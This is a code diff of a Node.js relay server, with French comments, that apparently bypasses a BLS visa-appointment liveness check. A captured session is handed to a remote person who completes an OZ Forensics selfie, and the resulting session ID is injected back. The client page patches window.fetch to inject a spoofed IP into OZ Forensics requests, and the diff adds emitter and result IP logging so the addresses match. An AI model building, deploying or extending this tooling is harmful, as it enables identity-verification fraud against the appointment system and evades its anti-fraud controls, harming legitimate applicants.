@@ -1,13 +1,14 @@
 /**
- * 2AO Selfie Server v1.1
+ * 2AO Selfie Server v1.2
  * Deploy on Render: https://dz34sni-26.onrender.com
  * 
+ * v1.2: emitterIp (vraie IP d'emission du POST /task) + resultIp
  * v1.1: Added proxy field to task storage (backward compatible)
  * 
  * Flow (uses 4-digit CODE instead of phone):
  * 1. Agent captures userId + transactionId from BLS liveness page
  * 2. Agent POSTs task to /task/:code
- * 3. Client polls GET /task/:code → receives task
+ * 3. Client polls GET /task/:code → receives task (+ emitterIp)
  * 4. Client navigates to GET /oz-page?... → loads OZ SDK → does selfie
  * 5. Client POSTs result to /result/:code
  * 6. Agent polls GET /result/:code → gets event_session_id → injects
@@ -63,10 +64,14 @@ setInterval(() => {
 app.post('/task/:code', (req, res) => {
     const code = req.params.code;
     const body = req.body || {};
-    
+
     if (!body.userId || !body.transactionId) {
         return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
     }
+
+    // ★ Vraie IP d'emission de la tache (source de verite pour le match IP)
+    const xfwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
+    const emitterIp = xfwd || req.ip || (req.socket && req.socket.remoteAddress) || '';
 
     tasks[code] = {
         userId: body.userId,
@@ -77,10 +82,11 @@ app.post('/task/:code', (req, res) => {
         userAgent: body.userAgent || '',
         pageUrl: body.pageUrl || '',
         verificationToken: body.verificationToken || '',
+        emitterIp: emitterIp,
         timestamp: body.timestamp || Date.now()
     };
 
-    console.log(`[TASK] 📥 ${code}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'} proxy=${body.proxy ? '✅' : '—'}`);
+    console.log(`[TASK] 📥 ${code}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'} proxy=${body.proxy ? '✅' : '—'} emitterIp=${emitterIp}`);
     res.json({ ok: true });
 });
 
@@ -108,16 +114,20 @@ app.post('/result/:code', (req, res) => {
         return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
     }
 
+    const xfwdR = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
+    const resultIp = xfwdR || req.ip || (req.socket && req.socket.remoteAddress) || '';
+
     results[code] = {
         event_session_id: body.event_session_id,
         status: body.status || 'completed',
         realIp: body.realIp || '',
+        resultIp: resultIp,
         timestamp: body.timestamp || Date.now()
     };
 
     delete tasks[code];
 
-    console.log(`[RESULT] ✅ ${code}: session=${body.event_session_id.substring(0, 20)}...`);
+    console.log(`[RESULT] ✅ ${code}: session=${body.event_session_id.substring(0, 20)}... resultIp=${resultIp}`);
     res.json({ ok: true });
 });
 
@@ -208,7 +218,7 @@ try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(
 (function(){
     var REAL_IP = '${ip}';
     if (!REAL_IP) return;
-    function isOzApi(u){ return typeof u==='string' && u.indexOf('ozforensics.com')!==-1 && u.indexOf('web-sdk.prod.cdn.spain.ozforensics.com')===-1; }
+    function isOzApi(u){ return typeof u==='string' && u.indexOf('ozforensics.com')!==-1; }
     var _f = window.fetch;
     window.fetch = function(u, o) {
         o = o || {};
@@ -339,7 +349,7 @@ window.addEventListener('load', function() {
 app.get('/', (req, res) => {
     res.json({
         service: '2AO Selfie',
-        version: '1.1',
+        version: '1.2',
         status: 'running',
         activeTasks: Object.keys(tasks).length,
         activeResults: Object.keys(results).length,
@@ -362,7 +372,7 @@ app.get('/debug', (req, res) => {
 // START
 // ═══════════════════════════════════════════
 app.listen(PORT, () => {
-    console.log(`\n🔥 2AO Selfie Server v1.1`);
+    console.log(`\n🔥 2AO Selfie Server v1.2`);
     console.log(`   Port: ${PORT}`);
     console.log(`   Ready!\n`);
 });
